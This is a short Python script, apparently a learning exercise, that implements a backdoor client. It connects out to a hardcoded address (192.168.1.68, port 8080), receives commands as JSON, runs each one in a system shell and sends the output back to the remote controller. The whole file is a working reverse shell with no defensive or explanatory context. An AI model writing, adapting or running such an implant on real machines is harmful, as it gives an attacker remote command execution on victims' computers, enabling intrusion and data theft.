import socket
import subprocess
import json


class Backdoor:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((self.ip, self.port))

    def reliable_send(self, data):
        try:
            data = data.decode("utf-8")
        except:
            pass

        json_data = json.dumps(data)
        json_data = json_data.encode("utf-8")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        json_data = json_data.decode("utf-8")
        command = json.loads(json_data)
        return command

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError:
            self.reliable_send("[-] Unknown command")

    def run(self):
        try:
            while True:
                command = self.reliable_receive()
                command_result = self.execute_system_command(command)
                self.reliable_send(command_result)

        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()


if __name__ == "__main__":
    ip = "192.168.1.68"
    port = 8080

    backdoor = Backdoor(ip, port)
    backdoor.run()


